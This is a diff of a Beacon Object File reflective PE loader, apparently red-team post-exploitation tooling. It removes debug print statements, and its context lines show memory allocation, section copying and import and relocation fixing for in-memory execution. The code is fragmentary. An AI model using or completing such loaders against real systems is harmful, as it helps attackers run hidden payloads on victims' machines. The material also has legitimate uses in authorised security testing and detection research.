@@ -206,14 +206,6 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     INT8  AllocMtd  = BeaconDataInt( &Parser );
     INT8  WriteMtd  = BeaconDataInt( &Parser );
 
-    DbgPrint("Buffer %p %d\n", Buffer, Length);
-    DbgPrint("args %s\n", Arguments);
-    DbgPrint("exp fnc %s\n", ExportFnc);
-    DbgPrint("pe key %s\n", PeKey);
-    DbgPrint("timeout %s\n", TimeOut);
-    DbgPrint("alloc mtd %d\n", AllocMtd);
-    DbgPrint("write mtd %d\n", WriteMtd);
-
     UPTR   Entry     = 0;
     ULONG  ThreadID  = 0;
     ULONG* Reads     = { 0 };
@@ -273,12 +265,8 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         return;
     }
 
-    DbgPrint("memory allocated %p\n", ImgBase);
-
     Entry = ( U_PTR( ImgBase ) + Header->OptionalHeader.AddressOfEntryPoint );
     Delta = ( U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase );
-
-    DbgPrint("entry %p\n", Entry);
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         Mem::Copy<PVOID>(
@@ -288,29 +276,18 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         );
     }
 
-    DbgPrint("copied\n");
-
     if ( ImpDir->VirtualAddress ) {
-        DbgPrint("exist\n");
         Fix::Imp( ImgBase, ImpDir );
     }
     
-    DbgPrint("outra copisaq\n");
-
     if ( RelDir->VirtualAddress ) {
-        DbgPrint("exist\n");
         Fix::Rel( ImgBase, Delta, RelDir );
     }
     
-    DbgPrint("outra copisaq\n");
-
-
     // if ( ExpDir->VirtualAddress ) {
     //     DbgPrint("exist\n");
     //     Fix::Exp( ImgBase, ExpDir );
     // }
-
-    DbgPrint("outra copisaq\n");
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         PVOID    SectionPtr       = PTR( U_PTR( ImgBase ) + SecHdr[i].VirtualAddress );
